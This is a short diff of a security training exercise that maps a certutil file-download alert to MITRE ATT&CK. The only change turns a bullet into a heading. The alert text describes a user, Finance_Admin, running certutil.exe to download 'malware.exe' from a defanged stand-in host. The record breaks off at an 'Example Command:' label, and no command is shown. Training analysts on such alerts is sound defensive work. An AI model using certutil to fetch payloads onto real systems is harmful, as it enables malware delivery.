@@ -1,5 +1,6 @@
 ## TASK 3: MITRE ATT&CK Mapping – Certutil File Download
-• Alert Description
+
+# Alert Description
 User Finance_Admin used certutil.exe to download a file from "hxxp://badsite.xyz/malware.exe"
 
 • Example Command:
